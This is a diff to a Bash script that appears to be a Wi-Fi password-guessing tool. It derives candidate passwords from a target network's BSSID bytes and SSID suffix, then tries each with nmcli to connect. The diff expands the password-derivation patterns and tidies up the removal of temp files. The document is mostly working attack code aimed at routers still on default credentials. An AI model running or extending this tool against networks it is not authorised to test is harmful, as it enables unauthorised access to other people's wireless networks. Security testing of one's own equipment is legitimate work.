@@ -19,12 +19,16 @@ __Ctrl_c__() {
     exit 1
 }
 
+# Remove temp files de uma execução anterior
+rm -rf /tmp/password* /tmp/ssid* /tmp/bssid* /tmp/temp*
+
 # Banner
 clear
 echo " "
-echo -e "${RED_BLINK}         ━━━━━━━ ${END}${RED} ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓  ${END}"
-echo -e "${RED_BLINK}           ━━━   ${END}${RED} ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃  ${END}"
-echo -e "${RED_BLINK}            ━    ${END}${RED} ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛  ${END}"
+echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
+echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
+echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
+echo -e "${RED}            https://github.com/caique-garbim  ${END}"
 echo " "
 echo -e " This tool searches for nearby Wi-Fi networks and performs"
 echo -e " authentication attempts on the networks based on default"
@@ -70,9 +74,10 @@ cat /tmp/bssid.txt | head -n$wifi | tail -n1 > /tmp/bssid_atk.txt
 # Banner
 clear
 echo " "
-echo -e "${RED_BLINK}         ━━━━━━━ ${END}${RED} ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓  ${END}"
-echo -e "${RED_BLINK}           ━━━   ${END}${RED} ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃  ${END}"
-echo -e "${RED_BLINK}            ━    ${END}${RED} ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛  ${END}"
+echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
+echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
+echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
+echo -e "${RED}            https://github.com/caique-garbim  ${END}"
 echo " "
 echo -e " This tool searches for nearby Wi-Fi networks and performs"
 echo -e " authentication attempts on the networks based on default"
@@ -91,6 +96,18 @@ cat /tmp/bssid_atk.txt | cut -d ":" -f3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/
 cat /tmp/bssid_atk.txt | cut -d ":" -f2,3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> /tmp/password_atk.txt
 # 1º byte em diante
 cat /tmp/bssid_atk.txt | cut -d ":" -f1,2,3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> /tmp/password_atk.txt
+# Alterando o último byte (3º byte em diante)
+cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
+cat /tmp/bssid_atk.txt | cut -d ":" -f3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
+paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
+# Alterando o último byte (2º byte em diante)
+cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
+cat /tmp/bssid_atk.txt | cut -d ":" -f2,3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
+paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
+# Alterando o último byte (1º byte em diante)
+cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
+cat /tmp/bssid_atk.txt | cut -d ":" -f1,2,3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' |sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
+paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
 
 # Exibe a wordlist
 echo -e "${BLUE} [*] Passwords to try"
@@ -117,6 +134,10 @@ do
 		echo -e " [*] Connecting..."
 		sudo nmcli dev wifi connect $SSID password $pass
 		echo " "
+		echo -e "${BLUE} [*] Removing temp files...${END}"
+		rm -rf /tmp/password* /tmp/ssid* /tmp/bssid* /tmp/temp*
+		echo -e "${BLUE} [*] Exiting...${END}"
+		echo " "
 		exit
 	fi	
 done
@@ -125,11 +146,7 @@ done
 echo " "
 echo -e "${RED} [!] Password not found.${END}"
 echo -e "${BLUE} [*] Removing temp files...${END}"
-rm -rf /tmp/password*
-rm -rf /tmp/ssid*
-rm -rf /tmp/bssid*
-rm -rf /tmp/temp.txt
-rm -rf /tmp/temp1.txt
+rm -rf /tmp/password* /tmp/ssid* /tmp/bssid* /tmp/temp*
 echo -e "${BLUE} [*] Exiting...${END}"
 echo " "
 exit
